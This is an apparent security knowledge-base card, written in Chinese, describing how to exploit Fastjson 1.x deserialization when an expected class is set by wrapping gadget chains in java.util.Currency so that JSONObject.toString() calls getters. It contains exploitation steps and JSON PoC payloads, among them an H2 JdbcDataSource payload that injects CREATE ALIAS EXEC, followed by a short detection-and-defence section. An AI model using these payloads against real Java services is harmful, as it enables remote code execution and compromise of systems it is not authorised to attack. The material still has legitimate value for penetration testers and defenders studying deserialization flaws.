---
id: web-java-deser-fastjson-currency-getter-expected-class
title: Fastjson 有期望类时用 java.util.Currency 包装触发所有 getter
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-currency-getter-trigger
aliases:
- Currency 触发 getter
- fastjson 期望类绕过 getter
- java.util.Currency fastjson
- JSONObject.toString 触发 getter
- 期望类 getter 链
tags:
- java
- fastjson
- deserialization
- expected-class
- getter
- currency
- misc-codec
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-04'
updated: '2026-11-04'
---

## 一句话结论

当反序列化点带有期望类、常规 getter 链打不起来时，用 `java.util.Currency` 包住 payload：`MiscCodec` 对 `Currency` 会读取 `currency` 字段并调用 `JSONObject.getString`，把嵌套 `JSONObject` 转成字符串时会执行 `toString()`，从而触发被包装对象的所有 getter。

## 原理

Fastjson 的 getter 触发依赖反序列化路径：

- `parse` / 多参 `parseObject`（有期望类）会调用 setter 和部分符合条件的 getter；
- 单参 `parseObject` 会额外触发所有 public getter；
- `parse` 不指定类型时，`$ref` 可以触发任意字段的 getter。

但存在期望类时：

1. 靠 getter 触发的 payload 大多数打不起来；
2. `$ref` 引用基本不可用——结果会被转成期望类对象，引用只能落到期望类已有成员上；成员多为 String/数字，而链里要引用的是对象，类型不匹配就断链。

`MiscCodec` 对 `Currency` 有特殊分支：

```java
if (clazz == Currency.class) {
    String currency = jsonObject.getString("currency");
    if (currency != null) return Currency.getInstance(currency);
}
```

当 `currency` 的值不是字符串而是嵌套 `JSONObject` 时，`getString` 会对它调用 `toString()`。Fastjson 的 `JSONObject.toString()` 会序列化整个对象，这个序列化过程会调用被包装对象的 getter。于是把任意 getter 链塞进 `currency` 的嵌套对象，即可在期望类场景下触发。

## 触发条件

- fastjson 1.x，反序列化点带有期望类（`parseObject(json, Xxx.class)` 或 Spring 参数绑定注入期望类）；
- 常规 getter 链/`$ref` 因期望类转换失败；
- 目标 classpath 存在 `java.util.Currency`（JDK 自带）与所需 gadget 类；
- 允许 `@type` 或已通过其他方式加载目标类型。

## 利用步骤

1. 确认反序列化点存在期望类：用 `{"@type":"com.alibaba.fastjson.support.geo.Feature"}` 或 `{{}:{}}` 探测（见关联的探测卡）；
2. 选一个依赖 getter 的 gadget（如 H2 `JdbcDataSource` 的 `connection`、commons-io 的 `BOM` 等）；
3. 把 gadget 放进 `Currency` 的 `currency` 嵌套对象中，外层再套 `@type: java.util.Currency`；
4. 发送后观察 getter 副作用（JNDI/文件/命令）；Currency 分支可能最终报错，但 getter 已在 `toString()` 阶段执行；
5. 若外层还被期望类限制，可把 Currency 结构嵌入期望类允许的字段或数组。

## PoC

```json
{
  "x": {
    "@type": "java.util.Currency",
    "val": {
      "currency": {
        "xx": {
          "PAYLOAD_HERE": {}
        }
      }
    }
  }
}
```

H2 示例（内层 gadget 省略字节码）：

```json
{
  "x": {
    "@type": "java.util.Currency",
    "val": {
      "currency": {
        "xx": {
          "x1": {"@type": "java.lang.Class", "val": "org.h2.jdbcx.JdbcDataSource"},
          "c": {
            "@type": "org.h2.jdbcx.JdbcDataSource",
            "url": "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS '...';CALL EXEC()"
          }
        }
      }
    }
  }
}
```

也可把最外层 `val` 换成 `currencyCode`，或改用 `JSONArray`/`JSONObject` 作为包装。

## 变体与关联

- 包装形式：`val.currency`、`val.currencyCode`；内层可用 `JSONObject` 或 `JSONArray`。
- 触发点：`JSONObject.toString()` 的序列化会遍历字段并调用 getter，适合把依赖 getter 的链（JDBC、commons-io、H2）重新拉起。
- 与 `$ref` 的对比：无期望类时 `$ref` 更直接；有期望类时 Currency 是补充。
- 关联：[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]（io7 在有期望类时套 Currency）；Fastjson 各版本 gadget 链。

## 检测与防御

- 检测：请求体出现 `"@type":"java.util.Currency"` 且 `currency`/`currencyCode` 的值是对象而非字符串；嵌套层级异常深。
- 防御：升级 Fastjson、开启 SafeMode、对 `@type` 做白名单；不要在不可信输入上使用带期望类的 `parseObject`；限制 `java.util.Currency` 等 MiscCodec 类型的反序列化。
- 注意：Currency 链最终可能抛异常，不能以“请求报错”判断未利用成功，应检查 getter 副作用（外连、文件、命令）。
